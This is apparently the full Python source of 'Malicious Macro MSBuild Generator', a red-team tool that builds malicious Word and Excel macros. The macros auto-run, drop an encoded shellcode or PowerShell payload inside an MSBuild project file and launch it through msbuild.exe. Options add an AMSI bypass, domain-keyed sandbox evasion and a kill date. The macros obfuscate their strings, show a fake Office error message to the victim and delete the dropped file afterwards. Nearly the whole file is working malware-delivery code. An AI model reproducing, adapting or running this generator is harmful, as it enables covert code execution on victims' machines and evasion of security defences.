#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os, re, sys, base64
import random, string, argparse

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def gen_str():
	return ''.join(random.choice(string.letters) for i in range(random.randint(8,12)))

def minimize(output):
    output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
    output = output.replace('\n', '')
    output = re.sub(r'\s{2,}', ' ', output)
    output = re.sub(r'\s+([^\w])\s+', r'\1', output)
    output = re.sub(r'([^\w"])\s+', r'\1', output)

    variables = {
        'payload' : 'x',
        'method' : 'm',
        'asm' : 'a',
        'instance' : 'o',
        'pipeline' : 'p',
        'runspace' : 'r',
        'decoded' : 'd'
    }

    for k, v in variables.items():
        output = output.replace(k, v)

    return output

def generate_shellcode(filename):
	shellcode = ''

	if not os.path.exists(filename):
		print '[!] File Not Found'
		sys.exit(0)

	with open(filename) as f:
	   shellcode = bytes(bytearray(f.read()))
	   f.close()

	targetName = gen_str()
	template = open('templates/MSBuild_shellcode.csproj','r').read()
	msbuild = template.replace('[SHELLCODE]',base64.b64encode(shellcode)).replace('[TARGETNAME]',targetName)

	return msbuild

def generate_powershell(filename):
    powershell = ''

    if not os.path.exists(filename):
    	print '[!] File Not Found'
    	sys.exit(0)

    with open(filename, 'rb') as f:
      inp = f.read()
      powershell += inp

    ps = base64.b64encode(powershell)
    targetName = gen_str()
    template = open('templates/MSBuild_powershell.csproj','r').read()
    msbuild = template.replace('[POWERSHELL]',ps).replace('[TARGETNAME]',targetName)

    return msbuild

def generate_custom(filename):
    content = ''

    if not os.path.exists(filename):
    	print '[!] File Not Found'
    	sys.exit(0)

    with open(filename, 'rb') as f:
      inp = f.read()
      content += inp

    return content

def generate_macro(msbuild_template, amsi_bypass=False, sandbox=False, killdate=False):
	Method = gen_str()
	Method2 = gen_str()
	Method3 = gen_str()	
	Str = gen_str()

	csproj = random.choice([
		"TrackPackageWeb","DebugInfo","CoppisAdditions","BusinessLayer",
		"NativeClientVSAddIn", "WikiUpdater","AuthorizeNet.Helpers",
		"CreateWordDoc","TimeSeries","JUpdate","UnityImageProcessing",
		"LogicLayer","Common7","BillingStatement"])

	msbuild_encoded = base64.b64encode(minimize(msbuild_template))
	chunk = list(chunks(msbuild_encoded,200))

	macro_str = ''
	
	if amsi_bypass == True:
		macro_str += 'Function ' + Method2 + '()\n'
		# https://github.com/outflanknl/Scripts/raw/master/AMSIbypasses.vba	
		macro_str += '  curfile = ActiveDocument.Path & "\" & ActiveDocument.Name\n'
		macro_str += '  templatefile = Environ("appdata") & "\Microsoft\Templates\" & DateDiff("s", #1/1/1970#, Now()) & ".dotm"\n'
		macro_str += '  ActiveDocument.SaveAs2 FileName:=templatefile, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=True\n'
		macro_str += '  ActiveDocument.SaveAs2 FileName:=curfile, FileFormat:=wdFormatXMLDocumentMacroEnabled\n'
		macro_str += '  Documents.Add Template:=templatefile, NewTemplate:=False, DocumentType:=0\n'
		macro_str += 'End Function\n\n'

		macro_str += "Sub AutoNew()\n"
		if sandbox is not None:
			macro_str += '  ' + Method3
		else:
			macro_str += '  ' + Method	
		macro_str += '\nEnd Sub\n\n'

	macro_str += 'Function decodeBase64(ByVal vCode)\n'
	macro_str += '  Dim oXML, oNode\n'
	macro_str += '  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")\n'
	macro_str += '  Set oNode = oXML.CreateElement("base64")\n'
	macro_str += '  oNode.dataType = "bin.base64"\n'
	macro_str += '  oNode.Text = vCode\n'
	macro_str += '  decodeBase64 = sBinToStr(oNode.nodeTypedValue)\n'
	macro_str += '  Set oNode = Nothing\n'
	macro_str += '  Set oXML = Nothing\n'
	macro_str += 'End Function\n'

	macro_str += '\nPrivate Function sBinToStr(Binary)\n'
	macro_str += '  Const adTypeText = 2\n'
	macro_str += '  Const adTypeBinary = 1\n'
	macro_str += '  Dim BinaryStream\n'
	macro_str += '  Set BinaryStream = CreateObject("ADODB.Stream")\n'
	macro_str += '  BinaryStream.Type = adTypeBinary\n'
	macro_str += '  BinaryStream.Open\n'
	macro_str += '  BinaryStream.Write Binary\n'
	macro_str += '  BinaryStream.Position = 0\n'
	macro_str += '  BinaryStream.Type = adTypeText\n'
	macro_str += '  BinaryStream.Charset = "us-ascii"\n'
	macro_str += '  sBinToStr = BinaryStream.ReadText\n'
	macro_str += '  Set BinaryStream = Nothing\n'
	macro_str += 'End Function\n\n'

	macro_str += 'Function ' + Method + '()\n'

	payload = Str+" = StrRev(\"" + str(chunk[0])[::-1] + "\")\n"

	for chk in chunk[1:]:
	    payload += "  "+Str+" = "+Str+" + StrRev(\"" + str(chk)[::-1] + "\")\n"

	macro_str += '  ' + payload

	macro_str += '\n  Open Environ(Replace("U###SE###RP###ROF###ILE","###","")) & "\\" & Replace("D###ow###nl###oa###ds","###","") & "\{}.csproj" For Output As #1\n'.format(csproj)
	macro_str += '  Print #1, decodeBase64(' + Str + ')\n'
	macro_str += '  Close #1\n\n'

	macro_str += '  Delay("00:00:" & Int((20 - 1 + 1 ) * Rnd + 1))\n'
	# https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3
	macro_str += '  Set SW = GetObject("n" & "e" & "w" & ":" & Replace("{9B###A0###597###2-F6A###8-11CF###-A44###2-00A###0C9###0A8###F3###9}","###","")).Item()\n'
	macro_str += '  SW.Document.Application.ShellExecute Replace("m###s###b###u###i###l###d###.e###x###e","###",""), Environ(Replace("U###SE###RP###ROF###ILE","###","")) & "\\" & Replace("D###ow###nl###oa###ds","###","") & "\{}.csproj", WhereIs(), Null, 0\n\n'.format(csproj)	
	macro_str += '  MsgBox "This application appears to be made on an older version of the Microsoft Office product suite. Visit https://microsoft.com for more information. [ErrorCode: 4439]", vbExclamation, "Microsoft Office Corrupt Application (Compatibility Mode)"\n\n'

	macro_str += '  Delay("00:00:" & Int((10 - 1 + 1 ) * Rnd + 1))\n'
	macro_str += '  Kill Environ(Replace("U###SE###RP###ROF###ILE","###","")) & "\\" & Replace("D###ow###nl###oa###ds","###","") & "\{}.csproj"\n'.format(csproj)	
	macro_str += 'End Function\n\n'

	if sandbox is not None:
		macro_str += 'Function ' + Method3 + '()\n'		
		macro_str += '  arrDomains = Split(Replace(StrRev("%s"),"###",","), ",")\n' % sandbox.replace(",","###")[::-1].lower()
		macro_str += '  If (UBound(Filter(arrDomains, LCASE(Environ("USERDOMAIN")))) > -1) = True Then\n'
		macro_str += '    ' + Method
		macro_str += "\n  End If\n"
		macro_str += 'End Function\n\n'
			
	if amsi_bypass == True:
		Method = Method2

		if sandbox is not None:
			Method3 = Method2
	
	macro_str += 'Sub Auto_Open()\n'
			
	if killdate is not None:		
		macro_str += '  Dim exdate As Date\n'
		macro_str += '  exdate = "%s"\n' % killdate
		macro_str += '  If Date < exdate Then\n  '

	if sandbox is not None:
		macro_str += '  ' + Method3
	else:
		macro_str += '  ' + Method	

	if killdate is not None:
		macro_str += '\n  End If'

	macro_str += '\nEnd Sub\n\n'

	macro_str += 'Sub AutoOpen()\n'
	macro_str += '  Auto_Open'	
	macro_str += '\nEnd Sub\n\n'

	macro_str += 'Sub Workbook_Open()\n'
	macro_str += '  Auto_Open'	
	macro_str += '\nEnd Sub\n\n'

	macro_str += 'Function StrRev(StrR as String) As String\n'
	macro_str += '  For i = Len(StrR) to 1  Step-1\n'
	macro_str += '    var= Mid(StrR, i, 1)\n'
	macro_str += '    Rev = Rev & var\n'
	macro_str += '  Next\n'
	macro_str += '  StrRev = Rev\n'
	macro_str += 'End Function\n\n'

	macro_str += 'Function FileExists(ByVal FileToTest As String) As Boolean\n'
	macro_str += '   FileExists = (Dir(FileToTest) <> "")\n'
	macro_str += 'End Function\n\n'

	macro_str += 'Function WhereIs() As String\n'
	macro_str += '  Dim business As String\n'
	macro_str += '  Dim needful As String\n'
	macro_str += '  Dim location_pw As String\n\n'

	macro_str += '  business = Replace("C###:\###Win###do###ws\###Micr###osof###t.NET\Fr###amewo###rk\\", "###", "")\n'
	macro_str += '  needful = Replace("\###ms###bu###ild.###exe", "###", "")\n\n'
	macro_str += '  If FileExists(business & "v4.0.30319\\" & needful) Then\n'
	macro_str += '     location_pw = business & "v4.0.30319\\"\n'
	macro_str += '  ElseIf FileExists(business & "v3.5\\" & needful) Then\n'
	macro_str += '     location_pw = business & "v3.5\\"\n'
	macro_str += '  End If\n'
	macro_str += '  WhereIs = location_pw\n'
	macro_str += 'End Function\n\n'

	macro_str += 'Function Delay(time as String) As String\n'
	macro_str += '  WaitUntil = Now() + TimeValue(time)\n'
	macro_str += '  Do While Now < WaitUntil\n'
	macro_str += '  Loop\n'
	macro_str += 'End Function'

	return macro_str


def output_file(filename,data):
	output = open(filename,"w")
	output.write(data)
	output.close()
	print "[+] {} macro sucessfully saved to disk.".format(filename)


def banner():
   return """
 /$$      /$$  /$$$$$$   /$$$$$$ 
| $$$    /$$$ /$$__  $$ /$$__  $$
| $$$$  /$$$$|__/  \ $$| $$  \__/
| $$ $$/$$ $$   /$$$$$/| $$ /$$$$
| $$  $$$| $$  |___  $$| $$|_  $$
| $$\  $ | $$ /$$  \ $$| $$  \ $$
| $$ \/  | $$|  $$$$$$/|  $$$$$$/
|__/     |__/ \______/  \______/ 

Malicious Macro MSBuild Generator v2.1
Author : Rahmat Nurfauzi (@infosecn1nja)
   """

if __name__ == "__main__":

   print banner()

   parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
   parser.add_argument('-i','--inputfile', help='Input file you want to embed into the macro', required=True)   
   parser.add_argument('-p','--payload', help='Choose a payload for powershell, raw shellcode or custom', required=True)
   parser.add_argument('-o','--output', help='Output filename for the macro', required=True)
   parser.add_argument('-a','--amsi_bypass', help='Macro AMSI Bypass Execute via ms office trusted location', action='store_true')
   parser.add_argument('-d','--domain', help=' Sandbox evasion technique using environmental keying domain checking. Use comma separating to set multiple domains')
   parser.add_argument('-k','--kill_date', help='Set kill date format [dd/MM/yyyy] the payload do not run on or after this day')

   args = parser.parse_args()

   inputfile = args.inputfile
   payload = args.payload
   output = args.output
   amsi_bypass = args.amsi_bypass
   domain = args.domain
   killdate = args.kill_date

   msbuild_payload = ''

   if payload.lower() == 'shellcode':
      msbuild_payload = generate_shellcode(inputfile)
   elif payload.lower() == 'powershell':
      msbuild_payload = generate_powershell(inputfile)
   elif payload.lower() == 'custom':
   	  msbuild_payload = generate_custom(inputfile)
   else:
      print '[!] Invalid type payload'
      sys.exit(0)

   if msbuild_payload != '':
   	print "[+] Writing msbuild {} payload.".format(payload)
   	macro = generate_macro(msbuild_payload, amsi_bypass, domain, killdate)
   	
   	if domain is not None:
   		print "[+] Using environmental keying with {} domains".format(domain)
 
   	if killdate is not None:
   		print "[+] Macro kill date is: {}!".format(killdate)

   	output_file(output,macro)
